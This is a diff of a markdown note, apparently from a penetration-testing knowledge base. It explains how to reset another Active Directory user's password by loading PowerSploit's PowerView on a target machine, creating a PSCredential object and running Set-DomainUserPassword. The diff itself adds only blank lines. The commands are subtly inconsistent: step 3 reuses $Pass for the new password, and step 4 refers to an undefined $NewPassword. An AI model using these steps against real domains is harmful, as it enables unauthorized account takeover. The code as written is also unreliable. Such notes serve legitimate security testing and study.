@@ -34,11 +34,17 @@ Change the password of an Active Directory user. This requires an account with s
 
 Change the password of an Active Directory user. This requires an account with sufficient authorization to modify other users' passwords (often via group membership or ACLs).
 
+
+
 # Instructions
 
 1. Download PowerView (dev branch), and import it on the target machine: [Download from GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 
 2. Create a PowerShell Credential object with an authorized user's credentials
+
+
+
+
 
 **Command** ([[Create a Windows PSCredential Object]]):
 
@@ -47,7 +53,15 @@ $Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
 $Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument "$_DOMAIN\$_USER", $Pass
 ```
 
+
+
+
+
 3. Create a Secure String object with the new password.
+
+
+
+
 
 **Command** ([[Create a Windows Secure String]]):
 
@@ -55,13 +69,25 @@ $Cred = New-Object -TypeName System.Management.Automation.PSCredential -Argument
 $Pass = ConvertTo-SecureString -String "$_PASSWORD" -AsPlainText -Force
 ```
 
+
+
+
+
 4. Use PowerView to reset the target user's password.
+
+
+
+
 
 **Command** ([[PowerView Reset a Domain User's Password]]):
 
 ```bash
 Set-DomainUserPassword -Identity $_TARGET_USER -AccountPassword $NewPassword -Credential $Cred
 ```
+
+
+
+
 
 ## Platforms
 
@@ -88,3 +114,5 @@ Set-DomainUserPassword -Identity $_TARGET_USER -AccountPassword $NewPassword -Cr
 
 - [[Active Directory]]
 - [[powershell]]
+
+
